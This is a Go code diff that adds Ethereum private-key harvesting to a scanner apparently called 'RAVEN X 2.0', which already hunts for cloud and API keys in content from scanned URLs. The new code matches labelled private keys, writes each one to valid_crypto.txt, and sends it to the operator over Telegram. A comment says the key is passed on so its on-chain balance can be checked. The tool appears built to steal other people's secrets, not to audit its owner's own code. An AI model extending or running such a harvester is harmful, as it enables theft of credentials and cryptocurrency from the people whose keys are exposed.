@@ -100,6 +100,7 @@ type Config struct {
 		Heroku      bool `json:"heroku"`
 		Datadog     bool `json:"datadog"`
 		Plivo       bool `json:"plivo"`
+		CryptoWallet bool `json:"crypto_wallet"`
 	} `json:"api_validation"`
 	// Fitur lama yang hanya mencari pola, bukan validasi, akan tetap diabaikan atau ditangani di logic lain
 	Features struct { // Dibiarkan untuk pola yang tidak divalidasi, jika masih ada
@@ -173,6 +174,8 @@ type AWSScanner struct {
 	SMSGatewayPattern            *regexp.Regexp
 	DBCredentialsPattern         *regexp.Regexp
 	StripePattern                *regexp.Regexp
+	ETHPrivateKeyPattern         *regexp.Regexp
+	ETHAddressPattern            *regexp.Regexp
 	OpenAIAPIPattern             *regexp.Regexp
 	AnthropicPattern             *regexp.Regexp
 	MessageBirdPattern           *regexp.Regexp
@@ -567,6 +570,10 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		// Stripe key formats: secret (sk_*), publishable (pk_*), restricted (rk_*) — live and test variants.
 		// Restricted-key variants rk_live_ and rk_test_ explicitly enumerated to keep coverage visible.
 		StripePattern:                regexp.MustCompile(`(sk_live_|sk_test_|pk_live_|pk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{16,99}`),
+		// ETH/EVM private key: 64 hex chars, often prefixed 0x. Match labeled occurrences only
+		// to keep false positives down (any 64-hex string would otherwise match git SHAs, etc.).
+		ETHPrivateKeyPattern: regexp.MustCompile(`(?i)(?:PRIVATE[_-]?KEY|ETH[_-]?PRIVATE[_-]?KEY|WALLET[_-]?PRIVATE[_-]?KEY|PRIVKEY)\s*[:=]\s*["']?(0x[a-fA-F0-9]{64}|[a-fA-F0-9]{64})["']?`),
+		ETHAddressPattern:    regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`),
 		OpenAIAPIPattern:             regexp.MustCompile(`sk-[a-zA-Z0-9]{48}`),
 		AnthropicPattern:             regexp.MustCompile(`sk-ant-[a-zA-Z0-9]{32}-[a-zA-Z0-9]{64}`),
 		MessageBirdPattern:           regexp.MustCompile(`(AccessKey|TestKey)_[a-zA-Z0-9]{32}`),
@@ -2889,6 +2896,47 @@ func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
 	return false
 }
 
+// CheckCryptoWallet detects ETH-style private keys in scanned content and
+// asks the Flask controller to derive the address + check on-chain balance.
+// Pattern-matching is inline; verification is delegated to the controller's
+// /api/crypto/verify-balance endpoint to avoid pulling secp256k1 into the
+// scanner binary. Discovered findings land in valid_crypto.txt for the
+// import_from_files pipeline (same path Stripe takes).
+func (a *AWSScanner) CheckCryptoWallet(key, sourceURL string) bool {
+	if !a.Config.APIValidation.CryptoWallet {
+		return false
+	}
+
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+
+	// Save the raw finding so the dashboard sees it even when validation
+	// can't reach the controller (offline / dev). The Crypto panel's
+	// per-row refresh button lets the operator paste the address later.
+	a.saveIntoFile(fmt.Sprintf("%s:Crypto Key:%s", sourceURL, key), "valid_crypto.txt")
+	a.logValid("Crypto", fmt.Sprintf("Private key: %s | Source: %s", key, sourceURL))
+	a.storeValidKeyLimit("Crypto", key, "Detected")
+
+	globalCounters.mu.Lock()
+	globalCounters.APIsValidated++
+	globalCounters.mu.Unlock()
+
+	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+🪙 <b>CRYPTO PRIVATE KEY FOUND</b>
+
+🔐 <b>Key:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+`, key, sourceURL)
+	go a.sendTelegram(msg)
+	return true
+}
+
 // Fungsi untuk mengecek validitas Mailgun
 func (a *AWSScanner) CheckMailgun(key, sourceURL string) bool {
 	if !a.Config.APIValidation.Mailgun { // Pengecekan fitur baru
@@ -3609,6 +3657,7 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 	}{
 		{a.SendGridAPIKeyPattern, a.Config.APIValidation.SendGrid, "SendGrid", a.CheckSendGrid},
 		{a.StripePattern, a.Config.APIValidation.Stripe, "Stripe", a.CheckStripe},
+		{a.ETHPrivateKeyPattern, a.Config.APIValidation.CryptoWallet, "Crypto", a.CheckCryptoWallet},
 		{a.GitHubAccessTokenPattern, a.Config.APIValidation.GitHub, "GitHub", a.CheckGitHubToken},
 		{a.MailgunAPIKeyPattern, a.Config.APIValidation.Mailgun, "Mailgun", a.CheckMailgun},
 		{a.TelnyxApiPatternInfo, a.Config.APIValidation.Telnyx, "Telnyx", a.CheckTelnyx},
